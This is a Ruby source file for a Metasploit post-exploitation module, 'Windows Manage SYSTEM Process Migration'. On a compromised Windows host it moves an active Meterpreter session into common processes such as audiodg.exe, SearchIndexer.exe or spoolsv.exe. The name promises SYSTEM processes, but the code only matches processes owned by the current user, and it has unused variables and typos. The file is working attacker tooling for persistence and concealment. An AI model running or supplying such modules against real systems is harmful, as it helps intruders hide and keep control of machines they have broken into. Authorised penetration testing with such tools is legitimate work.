##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage SYSTEM Process Migration',
      'Description'   => %q{ This module will migrate a Meterpreter session.
        It will first attempt to migrate to comon services for the SYSTEM user.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sm0k'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))


  end

  def run
    server = client.sys.process.open
    original_pid = server.pid
    print_status("Current server process: #{server.name} (#{server.pid})")

    uid = client.sys.config.getuid

    processes = client.sys.process.get_processes

    uid_RtkAudioService64_procs = []
	uid_audiodg_procs=[]
	uid_SearchIndexer_procs=[]
	
	uid_base_procs=[]
	base_proc_list=["RtkAudioService64.exe","audiodg.exe","SearchIndexer.exe","spoolsv.exe"]
	
	print_status "Looking for candidates..."
	base_proc_list.each do |baseproc|
		processes.each do |proc|
		  uid_base_procs << proc if proc['name'] == baseproc and proc["user"] == uid
		end
    end

	uid_base_procs.each do |uidbase|
		print_status "Attempting to move into #{uidbase['name']} for current user..."
		return if attempt_migration(uidbase['pid'])
	end

    

    print_error "Was unable to sucessfully migrate into any of our likely candidates"
  end


  def attempt_migration(target_pid)
    begin
      print_good("Migrating to #{target_pid}")
      client.core.migrate(target_pid)
      print_good("Successfully migrated to process #{target_pid}")
      return true
    rescue ::Exception => e
      print_error("Could not migrate in to process.")
      print_error(e.to_s)
      return false
    end
  end
end
